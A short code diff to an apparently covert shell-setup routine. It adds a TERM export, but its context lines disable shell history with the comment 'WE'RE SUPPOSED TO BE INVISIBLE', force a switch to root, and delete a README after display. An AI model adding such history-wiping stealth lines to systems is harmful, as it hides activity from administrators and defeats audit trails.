@@ -360,6 +360,7 @@ def bash_rc_setup():
 unset HISTFILE SAVEHIST TMOUT PROMPT_COMMAND # WE'RE SUPPOSED TO BE INVISIBLE, DAN
 if [ $(id -u) != 0 ]; then su root; fi
 if [ $(id -u) != 0 ]; then kill -9 $$; fi
+export TERM=xterm
 if [ -f "README" ]; then cat README | less; rm -f README; fi
 
 clear
